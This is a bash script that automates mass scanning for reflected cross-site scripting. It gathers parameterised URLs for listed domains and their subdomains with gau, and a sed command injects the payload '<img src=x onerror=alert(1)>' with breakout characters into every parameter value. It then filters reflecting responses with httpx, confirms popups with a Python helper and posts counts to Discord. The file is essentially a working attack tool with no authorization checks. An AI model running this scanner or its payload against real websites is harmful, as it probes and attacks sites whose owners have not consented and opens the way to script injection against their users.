#!/bin/bash

# Define colors
COLOR_RED='\033[0;31m'
COLOR_GREEN='\033[0;32m'
COLOR_YELLOW='\033[0;33m'
COLOR_BLUE='\033[0;34m'
COLOR_MAGENTA='\033[0;35m'
COLOR_CYAN='\033[0;36m'
COLOR_RESET='\033[0m'

GMT_OFFSET=+6
TIME_GMT_12=$(TZ="GMT${GMT_OFFSET}" date '+%Y-%m-%d %I:%M:%S %p')

# Define directories and files
DOMAIN_FILE="$1"
LOG_FILE="logs.txt"
POTENTIAL_XSS_DIR="potentialXSS"
XSS_DIR="XSS"

# Ensure the required tools are available
command -v gau >/dev/null 2>&1 || { echo -e "${COLOR_RED}gau command not found. Please install it.${COLOR_RESET}"; exit 1; }
command -v httpx >/dev/null 2>&1 || { echo -e "${COLOR_RED}httpx command not found. Please install it.${COLOR_RESET}"; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo -e "${COLOR_RED}python3 command not found. Please install it.${COLOR_RESET}"; exit 1; }

# Create directories if they don't exist
mkdir -p "$POTENTIAL_XSS_DIR" "$XSS_DIR"

# Read each domain from the domain.txt file
while IFS= read -r domain; do
    echo -e "\n${COLOR_GREEN}[+][${TIME_GMT_12}]: URL grabbing started using gau for ${domain}${COLOR_RESET}"

    # Run the gau command and save the output to a file
    gau "$domain" --subs | grep "=" > "${domain}_gau_equalTo.txt"
    echo -e "\n${COLOR_GREEN}[+][${TIME_GMT_12}]: Total URLs found from GAU: $(wc -l < ${domain}_gau_equalTo.txt)${COLOR_RESET}"

    # Use sed to modify the URLs and save the result to a new file
    sed -e 's/=\([^&]*\)/=-->'\'';\\"\/><\/textarea><img src=x onerror=alert(1)><XSS>/g' "${domain}_gau_equalTo.txt" > "${domain}_updated_urls.txt"
    
    # Sort and remove duplicates
    sort "${domain}_updated_urls.txt" | uniq > "${domain}_unique_urls.txt"
    echo -e "\n${COLOR_GREEN}[+][${TIME_GMT_12}]: Unique URLs found after Sorting: $(wc -l < ${domain}_unique_urls.txt)${COLOR_RESET}\n"

    # HTTPX
    echo -e "${COLOR_YELLOW}[+][${TIME_GMT_12}]: Running HTTPX matchers to find potential XSS parameter for ${domain}${COLOR_RESET}\n"
    cat "${domain}_unique_urls.txt" | httpx -ms "<XSS>" -o "$PWD/$POTENTIAL_XSS_DIR/${domain}_pxss.txt" -silent
    echo -e "\n${COLOR_GREEN}[+][${TIME_GMT_12}]: Potential XSS found after HTTPX matchers: $(wc -l < $PWD/$POTENTIAL_XSS_DIR/${domain}_pxss.txt)${COLOR_RESET}\n"

    # Log entry
    (
        echo -e "${COLOR_MAGENTA}=============================================${COLOR_RESET}"
        echo -e "${COLOR_CYAN}Domain Name                              : ${domain}${COLOR_RESET}"

        unique_urls_lines=$(wc -l < "${domain}_unique_urls.txt")
        equalTo_lines=$(wc -l < "${domain}_gau_equalTo.txt")
        pxss_lines=$(wc -l < "$PWD/$POTENTIAL_XSS_DIR/${domain}_pxss.txt")

        # Print the results
        printf "${COLOR_YELLOW}%-40s : %d line${COLOR_RESET}\n" "URLs with Param" "$equalTo_lines"
        printf "${COLOR_YELLOW}%-40s : %d line${COLOR_RESET}\n" "Unique URLs" "$unique_urls_lines"
        printf "${COLOR_YELLOW}%-40s : %d line${COLOR_RESET}\n" "Potential XSS" "$pxss_lines"

        echo -e "${COLOR_MAGENTA}=============================================${COLOR_RESET}"
    ) >> "$LOG_FILE"

    # Remove temporary files
    rm -f "${domain}_gau_equalTo.txt" "${domain}_updated_urls.txt" "${domain}_unique_urls.txt"

    # Python XSS tool
    echo -e "${COLOR_BLUE}[+][${TIME_GMT_12}]: XSS Popup Detector Python Script is running on ${domain}${COLOR_RESET}\n"
    python3 $PWD/scripts/xss.py -l "$PWD/$POTENTIAL_XSS_DIR/${domain}_pxss.txt" -o "$PWD/$XSS_DIR/${domain}_xss.txt" -t 20

    # Cleanup
    find . -maxdepth 1 -type f ! -name $DOMAIN_FILE ! -name $LOG_FILE -exec rm -f {} +

    # Notify
    xss_count=0
    potential_xss_count=0

    xss_file="$PWD/$XSS_DIR/${domain}_xss.txt"
    if [[ -f "$xss_file" ]]; then
       xss_count=$(wc -l < "$xss_file")
    fi

    pxss_file="$PWD/$POTENTIAL_XSS_DIR/${domain}_pxss.txt"
    if [[ -f "$pxss_file" ]]; then
       potential_xss_count=$(wc -l < "$pxss_file")
    fi

    echo -e "${COLOR_GREEN}[+][${TIME_GMT_12}]: XSS Detected: $xss_count and Potential XSS found: $potential_xss_count on $domain${COLOR_RESET}" | notify -provider discord -id rxss -silent

done < "$DOMAIN_FILE"

echo -e "${COLOR_GREEN}[+][${TIME_GMT_12}]: All Domain Scanned: $(wc -l < $DOMAIN_FILE)\nTotal XSS Detected: $(find $PWD/XSS/ -type f -exec cat {} + | wc -l)${COLOR_RESET}" | notify -provider discord -id rxss -silent
